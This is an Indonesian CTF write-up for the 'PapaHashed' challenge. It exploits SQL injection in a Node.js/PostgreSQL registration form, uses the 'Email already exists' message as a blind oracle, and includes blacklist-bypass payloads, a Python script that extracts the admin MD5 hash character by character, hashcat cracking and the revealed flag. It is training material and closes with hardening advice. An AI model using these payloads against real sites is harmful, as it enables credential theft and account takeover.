# Write-up: PapaHashed

## Ringkasan

Target meminta kita **login sebagai `admin@ristek.com`**. Dari arsip `dist.zip` terlihat aplikasinya adalah **Node.js + PostgreSQL** dengan modul autentikasi sederhana:

* `findByEmail(email)` membangun **raw SQL**: `SELECT * FROM users WHERE email = '<email>'`.
* **Blacklist** naif (memblokir string `OR` dengan spasi, `UNION`, komentar, dll).
* Password disimpan sebagai **MD5**, dan saat login dicek `md5(input) == user.password`.
* Halaman `/dashboard` menampilkan **flag hanya bila email = `admin@ristek.com`**.

Kelemahannya: **SQL Injection di parameter email**. Kita memanfaatkannya lewat **error-based/blind** menggunakan pesan “Email already exists” pada endpoint **Register** sebagai *oracle*.

Flag akhir:

```
COMPFEST17{Ju5t_s0m3_3rr0r_b4s3d_SQL_50389de056}
```

---

## Enumerasi & Validasi SQLi

Di **/auth/register**, server akan memanggil `findByEmail(email)`. Jika kueri mengembalikan baris, UI memunculkan **“Email already exists”**. Ini bisa kita jadikan indikator TRUE/FALSE.

Blacklist hanya memblokir `OR` (dengan spasi), jadi kita bisa **menghilangkan spasi**:

```
Email: 'OR'1'='1
Password: apa saja
```

Jika muncul **“Email already exists”**, berarti injeksi mengeksekusi dan kondisi TRUE.

---

## Eksfiltrasi Hash Admin (error-based oracle)

Kita gunakan per-karakter terhadap `password` milik admin. Di PostgreSQL, `SUBSTRING(x FROM i FOR 1)` mengambil 1 karakter di posisi `i`.

Payload (posisi ke-`i`, kandidat `c`):

```
'OR(SUBSTRING((SELECT password FROM users WHERE email='admin@ristek.com') FROM i FOR 1)='c')AND'1'='1
```

* **Benar** → kueri mengembalikan baris → **“Email already exists”** (TRUE).
* **Salah** → tidak ada baris → proses register lanjut (FALSE).
* Tidak menggunakan spasi di sekitar `OR`, tidak pakai komentar — aman dari blacklist.

Ulangi `i = 1..32` dan `c ∈ 0123456789abcdef` untuk membangun 32 heksadesimal **MD5 admin**.

### Otomasi

```python
# solve.py
import requests, re

BASE = "http://ctf.compfest.id:7302"
TARGET = "admin@ristek.com"
hexchars = "0123456789abcdef"
s = requests.Session()

def is_true(payload):
    r = s.post(f"{BASE}/auth/register",
               data={"email": payload, "password": "x"},
               allow_redirects=False)
    return "Email already exists" in r.text

# sanity check
print("Injectable?", is_true("'OR'1'='1"))

hash_hex = []
for i in range(1, 33):
    for c in hexchars:
        p = f"'OR(SUBSTRING((SELECT password FROM users WHERE email='{TARGET}') FROM {i} FOR 1)='{c}')AND'1'='1"
        if is_true(p):
            hash_hex.append(c)
            print(f"[+] {i}: {c}  -> {''.join(hash_hex)}")
            break
    else:
        raise RuntimeError(f"no match at pos {i}")

admin_md5 = ''.join(hash_hex)
print("[+] admin md5:", admin_md5)
```

---

## Crack MD5 → Dapatkan Password Admin

Sesuai hint challenge (“There are online tools to crack hashes”), kirim hash ke **CrackStation** / jalankan `hashcat -m 0` dengan wordlist umum sampai mendapat plaintext.

Contoh:

```
hashcat -m 0 admin_hash.txt rockyou.txt
```

---

## Ambil Flag

Login:

```
Email   : admin@ristek.com
Password: <hasil crack MD5>
```

Buka `/dashboard`. Karena email == admin, halaman merender **flag**:

```
COMPFEST17{Ju5t_s0m3_3rr0r_b4s3d_SQL_50389de056}
```

---

## Catatan Teknis & Bypass

* **Bypass blacklist**: deteksi `OR` (dengan spasi) gagal mencegah `'OR'...` tanpa spasi.
* **Mengapa “error-based”?** Kita tidak menampilkan data langsung di halaman, tapi menggunakan **pesan error/validasi** (“Email already exists”) sebagai **oracle** untuk menilai TRUE/FALSE, sehingga bisa *leak* hash per-karakter.
* **Hardening yang benar**:

  * Selalu gunakan **parameterized query** / ORM.
  * Jangan pakai **MD5** untuk password (gunakan Argon2/bcrypt/scrypt + salt).
  * Hindari **blacklist** string; gunakan whitelist/escaping yang benar.
  * Jangan beda-bedakan pesan error berdasarkan kondisi data (hindari orakel).

---

## Kesimpulan

Dengan memanfaatkan **SQLi pada email** dan **error-based oracle** pada endpoint **Register**, kita berhasil mengekstrak **MD5 admin**, mem-crack-nya, login sebagai admin, dan memperoleh flag:

```
COMPFEST17{Ju5t_s0m3_3rr0r_b4s3d_SQL_50389de056}
```

Selesai 🎯
